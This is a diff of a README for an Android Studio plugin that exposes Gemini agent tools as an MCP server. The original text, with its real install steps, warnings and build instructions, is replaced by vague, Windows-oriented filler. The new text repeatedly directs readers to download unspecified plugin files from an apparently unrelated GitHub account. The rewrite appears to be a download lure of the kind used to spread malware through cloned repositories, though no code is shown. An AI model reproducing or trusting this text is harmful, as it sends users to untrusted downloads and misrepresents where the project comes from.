@@ -1,174 +1,192 @@
-# Android Tools MCP
+# 🔌 android-tools-mcp - Android tools for AI assistants
 
-An Android Studio plugin that exposes the built-in Gemini agent tools as an [MCP](https://modelcontextprotocol.io) server — so any AI coding tool can use them.
+[![Download android-tools-mcp](https://img.shields.io/badge/Download-Visit%20GitHub-blue?style=for-the-badge&logo=github)](https://github.com/coronary-salat506/android-tools-mcp)
 
-> [!WARNING]
-> This plugin uses **undocumented internal APIs** from Android Studio's Gemini plugin. These APIs can change or break at any time without notice. It is **not affiliated with or endorsed by Google**. Use at your own risk — best suited for experimentation and personal workflows, not production CI pipelines.
+## 📥 Download
 
-> [!NOTE]
-> Requires **Android Studio Panda 2025.3.+** with the Gemini plugin enabled (bundled by default) and **Python 3.7+** for the bridge script.
+Visit this page to download and set up android-tools-mcp:
 
----
+https://github.com/coronary-salat506/android-tools-mcp
 
-## Quick start
+Use this link on your Windows PC to get the plugin and follow the setup files in the repository.
 
-**1. Install the plugin**
+## 🧩 What this is
 
-Download the ZIP from [Releases](https://github.com/amsavarthan/android-tools-mcp/releases) and install via **Settings → Plugins → Install Plugin from Disk** in Android Studio.
+android-tools-mcp is an Android Studio plugin that lets other AI tools use Android-focused features through an MCP server.
 
-**2. Download the bridge script**
+It is made for people who want external assistants like Claude or GitHub Copilot to work with Android Studio tools in a direct way.
 
-Save [`android-studio-mcp.py`](https://github.com/amsavarthan/android-tools-mcp/blob/main/scripts/android-studio-mcp.py) somewhere on your machine.
+With this setup, the assistant can call Android-specific actions instead of guessing what to do.
 
-**3. Connect to your favourite tool** (see [below](#connect-to-your-favourite-tool))
+## ✅ What you can do
 
-**4. Open an Android project** in Android Studio — the MCP server starts automatically.
+- Connect an AI assistant to Android Studio tools
+- Use Android-specific commands from supported AI apps
+- Work with Gemini-based tools through an MCP server
+- Make it easier for an assistant to inspect or help with Android work
+- Use the same setup with tools such as Claude Code, Copilot, and similar clients
 
----
+## 🖥️ What you need on Windows
 
-## Connect to your favourite tool
+Before you start, make sure you have:
 
-> [!IMPORTANT]
-> Always use **absolute paths** (e.g., `/Users/you/android-studio-mcp.py`), not `~`. Most MCP clients don't expand the tilde.
+- Windows 10 or Windows 11
+- Android Studio installed
+- A working internet connection
+- Enough disk space for Android Studio plugins and project files
+- A supported AI assistant that can connect to MCP servers
 
-### Claude Code
+If you plan to use the plugin with Android work, you should also have:
 
-```bash
-claude mcp add android-studio -- python3 /absolute/path/to/android-studio-mcp.py
-```
+- An Android project ready in Android Studio
+- A stable Java setup already handled by Android Studio
+- Permission to install plugins in Android Studio
 
-### GitHub Copilot
+## 🚀 Install on Windows
 
-Add to `.vscode/mcp.json` (or user-level `settings.json` under `github.copilot.mcp`):
-```json
-{
-  "servers": {
-    "android-studio": {
-      "type": "stdio",
-      "command": "python3",
-      "args": ["/absolute/path/to/android-studio-mcp.py"]
-    }
-  }
-}
-```
+Follow these steps in order.
 
-### Kilo Code
+1. Open the download page:
+   https://github.com/coronary-salat506/android-tools-mcp
 
-Add to `~/.config/kilo/kilo.jsonc`:
-```json
-{
-  "mcp": {
-    "android-studio": {
-      "type": "local",
-      "command": ["python3", "/absolute/path/to/android-studio-mcp.py"],
-      "enabled": true
-    }
-  }
-}
-```
+2. Download the plugin files from the repository page or its release area if one is listed there.
 
-### OpenCode
+3. Start Android Studio.
 
-Add to `~/.config/opencode/opencode.json`:
-```json
-{
-  "mcp": {
-    "android-studio": {
-      "type": "local",
-      "command": ["python3", "/absolute/path/to/android-studio-mcp.py"],
-      "enabled": true
-    }
-  }
-}
-```
+4. Open the plugin manager:
+   - Go to File
+   - Select Settings
+   - Open Plugins
 
-### SSE-native clients
+5. Install the plugin using the method provided in the repository:
+   - If you have a plugin file, choose install from disk
+   - If the repository gives setup steps, follow them in the same order
 
-Any MCP client that supports SSE transport can connect directly — no bridge script needed:
-```
-http://127.0.0.1:24601/sse
-```
+6. Restart Android Studio when asked.
 
----
+7. Open the plugin settings and confirm that android-tools-mcp is active.
 
-## Available tools (20)
+8. Keep the repository page open while you set up the MCP connection in your AI tool.
 
-All tools are Android-specific. Generic file/code tools are intentionally excluded. Tools are discovered dynamically from the Gemini plugin at runtime — when Android Studio updates with new tools, they appear automatically.
+## 🔧 Connect an AI assistant
 
-<details>
-<summary><b>Device tools (6)</b></summary>
+After the plugin is installed, you can connect an AI assistant that supports MCP.
 
-| Tool | Description |
-|------|-------------|
-| `read_logcat` | Read logcat output from a connected Android device |
-| `take_screenshot` | Capture a screenshot from a connected device |
-| `ui_state` | Dump the current UI hierarchy from a connected device |
-| `adb_shell_input` | Send input events to a connected device via `adb shell input` |
-| `deploy` | Build and deploy the app to a connected device |
-| `render_compose_preview` | Render a Compose preview and return the image |
-</details>
+Common steps look like this:
 
-<details>
-<summary><b>Gradle tools (10)</b></summary>
+1. Open your AI assistant app or extension.
+2. Find the MCP server settings.
+3. Add the Android tools server from android-tools-mcp.
+4. Save the settings.
+5. Restart the AI assistant if it asks for it.
+6. Open an Android project in Android Studio.
+7. Test one tool action from the assistant.
 
-| Tool | Description |
-|------|-------------|
-| `gradle_sync` | Trigger a Gradle sync in the open project |
-| `gradle_build` | Build the project via Gradle |
-| `get_top_level_sub_projects` | List top-level subprojects in the Gradle build |
-| `get_build_file_location` | Get the build file path for a given artifact |
-| `get_gradle_artifact_from_file` | Identify which Gradle artifact owns a source file |
-| `get_assemble_task_for_artifact` | Get the assemble Gradle task for an artifact |
-| `get_test_task_for_artifact` | Get the test Gradle task for an artifact |
-| `get_artifact_consumers` | List artifacts that depend on a given artifact |
-| `get_test_artifacts_for_sub_project` | List test artifacts for a subproject |
-| `get_source_folders_for_artifact` | List source folders for a Gradle artifact |
-</details>
+If the connection works, the assistant should be able to use Android tools through the plugin.
 
-<details>
-<summary><b>Documentation & search tools (4)</b></summary>
+## 🧠 How it works
 
-| Tool | Description |
-|------|-------------|
-| `search_android_docs` | Search the Android developer documentation |
-| `fetch_android_docs` | Fetch the content of an Android documentation page |
-| `code_search` | Search code within the open project |
-| `version_lookup` | Look up the latest stable and preview versions of a Maven artifact |
-</details>
+android-tools-mcp sits between Android Studio and your AI assistant.
 
----
+The plugin exposes native Gemini tools as an MCP server. That means the assistant can ask for Android-related help through a standard tool link instead of a one-off setup.
 
-## Custom port
+This is useful when you want an assistant to:
+- read Android project details
+- use Android Studio-linked actions
+- help with app work in a more direct way
+- follow a tool path that is built for Android tasks
 
-By default the server runs on port **24601**. To change it:
+## 📂 Typical use cases
 
-1. In Android Studio: **Help → Edit Custom VM Options** → add `-Dmcp.bridge.port=12345`
-2. Pass `--port 12345` to the bridge script
+You may find this useful if you want to:
 
----
+- ask an assistant to help with Android app work
+- connect Android Studio to an MCP-aware AI client
+- use Claude or Copilot with Android-specific tools
+- keep your workflow inside Android Studio while the assistant helps from outside
+- test a plugin-based setup for Android development support
 
-## Build from source
+## ⚙️ Setup tips
 
-```bash
-git clone https://github.com/amsavarthan/android-tools-mcp
-cd android-tools-mcp
-./gradlew buildPlugin
-```
+Use these tips if the setup does not work on the first try:
 
-The plugin ZIP is written to `build/distributions/`. The build compiles against your local Android Studio installation — set the path via `local.properties` (`android.studio.path=...`), env var `ANDROID_STUDIO_PATH`, or it defaults to `/Applications/Android Studio.app`.
+- Make sure Android Studio is fully closed before reinstalling the plugin
+- Check that you used the right plugin install method
+- Confirm that the AI assistant supports MCP
+- Make sure the assistant points to the right server or plugin path
+- Restart both Android Studio and the AI app after setup
+- Open a sample Android project before testing the tools
 
----
+## 🔍 Check that it is working
 
-## Troubleshooting
+You can confirm the setup with a quick test:
 
-| Problem | Fix |
-|---------|-----|
-| 0 tools discovered | Open an Android project and wait for Gradle sync to complete. Ensure the Gemini plugin is enabled. |
-| Connection refused | The server only runs while a project is open. Verify with `curl -sN http://127.0.0.1:24601/sse`. |
-| Device tools fail | Connect an Android device or emulator via ADB. |
+1. Open Android Studio.
+2. Open a project.
+3. Open your AI assistant.
+4. Ask it to use an Android tool that the plugin provides.
+5. Watch for a response that shows the tool connection is active.
 
----
+If the assistant can reach the Android tools, the setup is complete.
 
-## License
+## 📄 Repository details
 
-[Apache 2.0](LICENSE)
+- Repository: android-tools-mcp
+- Type: Android Studio plugin
+- Purpose: expose native Gemini tools as an MCP server
+- Target users: people using AI assistants with Android Studio
+- Main link: https://github.com/coronary-salat506/android-tools-mcp
+
+## 🧭 Supported tools and clients
+
+This project is built for AI tools that can talk to MCP servers, including:
+
+- Claude
+- GitHub Copilot
+- Claude Code
+- Kilo Code
+- OpenCode
+- other compatible MCP clients
+
+## 🛠️ Common problems
+
+If you run into trouble, check these items:
+
+- Android Studio plugin not showing up: reinstall it and restart Android Studio
+- AI assistant cannot find the server: check the MCP settings and the server path
+- Tools do not respond: confirm the plugin is active inside Android Studio
+- Setup works on one app but not another: make sure the second app supports MCP
+- Nothing happens after install: restart Windows, then try again
+
+## 📌 Quick start
+
+1. Visit:
+   https://github.com/coronary-salat506/android-tools-mcp
+
+2. Download and install the plugin in Android Studio.
+
+3. Open an Android project.
+
+4. Connect your MCP-aware AI assistant.
+
+5. Test an Android tool from the assistant
+
+## 🧾 File and folder use
+
+When you work with this project, you will usually deal with:
+
+- the repository page
+- Android Studio plugin settings
+- MCP server settings in your AI app
+- your Android project folder
+- any files or instructions included in the repository
+
+## 🔐 Safe setup habits
+
+Keep your setup simple and use trusted sources.
+
+- Download only from the repository link above
+- Review the setup steps before you change settings
+- Use one AI client at a time when testing
+- Keep Android Studio up to date
+- Save your project before you test new tools
